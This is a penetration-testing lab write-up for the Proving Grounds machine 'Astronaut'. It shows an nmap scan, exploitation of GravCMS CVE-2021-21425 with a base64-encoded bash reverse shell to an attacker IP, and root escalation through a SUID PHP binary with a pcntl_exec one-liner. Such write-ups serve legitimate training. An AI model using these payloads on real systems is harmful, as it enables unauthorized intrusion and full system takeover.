# Report-Astronaut

## Engagement Overview

Laboratory: Offensive Security Proving Grounds

Target Name: Astronaut

Target IP Address: 192.168.227.12

Operating System: Linux

## Information Gathering:


Full Nmap scan of all ports:

```bash
nmap -sC -sV -p- 192.168.227.12
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-20 10:41 +0100
Nmap scan report for 192.168.227.12
Host is up (0.035s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.41
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2021-03-17 17:46  grav-admin/
|_
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Index of /
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.63 seconds

```

Enumeration of port 80 using a browser:
<img width="1202" height="675" alt="Pasted image 20260120104306" src="https://github.com/user-attachments/assets/6beb2b1b-ab6d-4418-8674-c9ffcc248ec8" />

<img width="238" height="230" alt="Pasted image 20260120104358" src="https://github.com/user-attachments/assets/299e8b79-088e-472e-b8bc-1c9f0d53b335" />

Searching Exploit-DB for  PoC on Grav's vulnerability: 

<img width="1218" height="359" alt="Pasted image 20260120104613" src="https://github.com/user-attachments/assets/d50b72cd-7a10-41aa-a91a-10472b31493c" />


Proof of concept Code:https://www.exploit-db.com/exploits/49973

## Initial Access

Vulnerability Exploited:  GravCMS 1.10.7 - Unauthenticated Arbitrary YAML Write/Update (CVE-2021-21425)

Vulnerability Explanation: Grav Admin Plugin is an HTML user interface that provides a way to configure Grav and create and modify pages. In versions 1.10.7 and earlier, an unauthenticated user can execute some methods of administrator controller without needing any credentials. Particular method execution will result in arbitrary YAML file creation or content change of existing YAML files on the system.



### Exploitation:

I have to change target with the path of the machine http://192.168.227.12/grav-admin/ and base_decode64 with the output of this comand:
```
echo -ne "bash -i >& /dev/tcp/192.168.45.234/4444 0>&1" | base64 -w0
```
<img width="1072" height="483" alt="Pasted image 20260120105604" src="https://github.com/user-attachments/assets/d74b3464-c105-4d5c-8acf-3fb5ebcc35d8" />

Command:

```
python3 gravcms.py 
```

<img width="635" height="171" alt="Pasted image 20260120110002" src="https://github.com/user-attachments/assets/4a7baec9-62a3-4e94-b369-fb59ec08de89" />


## Privileged Escalation


Vulnerability Exploited: SUID misconfiguration

Vulnerability Explanation: The target system contains a misconfigured SUID-enabled PHP interpreter located at /usr/bin/php7.4. Since PHP allows the execution of arbitrary system commands through built-in functions, this misconfiguration can be abused to execute commands as root, resulting in full privilege escalation.


## Enumeration:

File system permissions were enumerated to identify binaries with misconfigured SUID permissions.
```bash
find / -perm -u=s -type f 2>/dev/null
```

The `/usr/bin/php7.4` binary is misconfigured and can be used to obtain elevated privileges.

<img width="252" height="93" alt="Pasted image 20260120111044" src="https://github.com/user-attachments/assets/5ecb1bb1-d0c7-418f-b34f-48fd72952f60" />



<img width="835" height="300" alt="Pasted image 20260120110826" src="https://github.com/user-attachments/assets/89ff2469-feef-4219-9f58-0a13374cafc8" />

## Exploitation:

```bash
php -r "pcntl_exec('/bin/sh', ['-p']);"
```


<img width="598" height="82" alt="Pasted image 20260120111157" src="https://github.com/user-attachments/assets/10f43eda-9abb-42a0-b43b-89a2ef375ded" />


The reverse shell was obtained as the root user.
